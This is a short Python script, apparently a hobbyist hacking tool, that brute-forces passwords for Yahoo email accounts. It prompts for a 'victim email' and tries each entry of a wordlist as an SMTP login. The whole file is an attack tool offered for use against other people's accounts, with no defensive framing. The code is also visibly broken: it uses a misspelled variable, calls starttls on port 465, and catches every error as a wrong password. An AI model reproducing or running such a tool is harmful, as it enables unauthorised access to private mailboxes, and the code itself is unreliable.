#!/usr/bin/env python
# *-* coding: iso-8859-1 *-*
import smtplib

print """
                       ('-. .-.                     
                       ( OO )  /                     
  ,--.   ,--.   .---.  ,--. ,--.  .----.    .----.   
   \  `.'  /   / .  |  |  | |  | /  ..  \  /  ..  \  
 .-')     /   / /|  |  |   .|  |.  /  \  ..  /  \  . 
(OO  \   /   / / |  |_ |       ||  |  '  ||  |  '  | 
 |   /  /\_ /  '-'    ||  .-.  |'  \  /  ''  \  /  ' 
 `-./  /.__)`----|  |-'|  | |  | \  `'  /  \  `'  /  
   `--'          `--'  `--' `--'  `---''    `---'' Coded By Whoamii
Put your pass list in same folder where y4h00.py is!
[INFO] This Bruteforce tool works only for yahoo.com emails!
"""
username = raw_input("Enter your victim email: ")

words = raw_input("Password text file? ex: pass.txt: ")
wordlist = open(words, 'r')

for i in wordlist.readlines():
    password = i.strip('\n')
    try:
        
       s = smtplib.SMTP("smtp.mail.yahoo.com", 465)
       s.ehlo()
       s.starttls()
       s.login(username, str(passowrd))
       s.close
       print "[+]Found!Password is: %s " % passowrd
    except:
       print "[-]Wrong password: " + password
        

